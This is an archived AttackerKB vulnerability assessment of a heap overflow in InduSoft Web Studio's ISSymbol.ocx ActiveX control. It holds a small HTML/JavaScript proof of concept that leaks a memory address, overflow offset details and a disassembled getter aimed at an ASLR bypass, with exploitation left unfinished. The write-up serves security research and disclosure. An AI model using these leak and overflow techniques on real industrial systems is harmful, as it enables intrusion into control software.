---
title: InduSoft Web Studio ISSymbol.ocx InternationalSeparator() Heap Overflow
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2011-05-04T22:55:00'
created: '2019-09-12T18:08:00.664017'
revision_date: '2020-02-13T17:12:06.530068'
assessment_id: 40d24a0b-1d82-4338-9aa9-e241306574e1
topic_id: 72a32040-b880-4c3c-890f-9ccae8820bb3
topic_short_id: fpcIcLQ6e0
topic_slug: indusoft-web-studio-issymbol-ocx-internationalseparator-heap-overflow
akb_topic_url: https://attackerkb.com/topics/fpcIcLQ6e0/indusoft-web-studio-issymbol-ocx-internationalseparator-heap-overflow
akb_assessment_url: https://attackerkb.com/topics/fpcIcLQ6e0/indusoft-web-studio-issymbol-ocx-internationalseparator-heap-overflow#40d24a0b-1d82-4338-9aa9-e241306574e1
---

# InduSoft Web Studio ISSymbol.ocx InternationalSeparator() Heap Overflow

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/fpcIcLQ6e0/indusoft-web-studio-issymbol-ocx-internationalseparator-heap-overflow#40d24a0b-1d82-4338-9aa9-e241306574e1).*

---

# Info Leak Through ForceRemoteBehavior

The ForceRemoteBehavior getter, when using an "unitialized" issymbol
object allows to disclose address from issymbol. Issymbol isn't aslr
compatible, but could rebase. Anyway, issymbol doesn't contain pointers
to interesting API's for ASLR bypass, so even when it would be easy
to use the issymbol.dll it won't be usefull because of this.

```
<html>
<body>
<object classid='clsid:3c9dff6f-5cb0-422e-9978-d6405d10718f' id='test'></object>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<script language='javascript'>
alert(test.ForceRemoteBehavior);
</script>
</body>
</html>
```

# Info Leak through StartupColumnTranslate

Overflowing the vulnerable InternationalSeparator() method with 212 bytes
allows to reach the pointer to the StartupColumnTranslate property (string).

By overflowing this pointer should be possible to retrieve arbitrary data
from the memory map by using the StartupColumnTranslate getter:

```
.text:1000EF40 StartupColumnTranslate_sub_1000EF40 proc near ; DATA XREF: .rdata:101DCE98o
.text:1000EF40
.text:1000EF40 var_10          = byte ptr -10h
.text:1000EF40 var_C           = dword ptr -0Ch
.text:1000EF40 var_4           = dword ptr -4
.text:1000EF40
.text:1000EF40                 push    0FFFFFFFFh
.text:1000EF42                 push    offset sub_101B7579
.text:1000EF47                 mov     eax, large fs:0
.text:1000EF4D                 push    eax
.text:1000EF4E                 push    ecx
.text:1000EF4F                 push    esi
.text:1000EF50                 mov     eax, ___security_cookie
.text:1000EF55                 xor     eax, esp
.text:1000EF57                 push    eax
.text:1000EF58                 lea     eax, [esp+18h+var_C]
.text:1000EF5C                 mov     large fs:0, eax
.text:1000EF62                 add     ecx, 2540h ; ecx + 2540h => pointer to StartupColumnTranslate property
.text:1000EF68                 push    ecx
.text:1000EF69                 lea     ecx, [esp+1Ch+var_10]
.text:1000EF6D                 call    ds:??0?$CStringT@_WV?$StrTraitMFC_DLL@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@QAE@ABV01@@Z ; ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>(CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>> const &)
.text:1000EF73                 lea     ecx, [esp+18h+var_10]
.text:1000EF77                 mov     [esp+18h+var_4], 0
.text:1000EF7F                 call    ds:?AllocSysString@?$CStringT@_WV?$StrTraitMFC_DLL@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@QBEPA_WXZ ; ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::AllocSysString(void)
.text:1000EF85                 lea     ecx, [esp+18h+var_10] ; void *
.text:1000EF89                 mov     esi, eax
.text:1000EF8B                 call    ds:__imp_??1?$CStringT@_WV?$StrTraitMFC_DLL@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@QAE@XZ ; ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::~CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>(void)
.text:1000EF91                 mov     eax, esi
.text:1000EF93                 mov     ecx, [esp+18h+var_C]
.text:1000EF97                 mov     large fs:0, ecx
.text:1000EF9E                 pop     ecx
.text:1000EF9F                 pop     esi
.text:1000EFA0                 add     esp, 10h
.text:1000EFA3                 retn
.text:1000EFA3 StartupColumnTranslate_sub_1000EF40 endp
```

PROBLEM: It's using the Microsoft Foundation Classes, and create fake
strings memory objects in memory isn't so easy! We should dig in to that,
should be possible with more work!
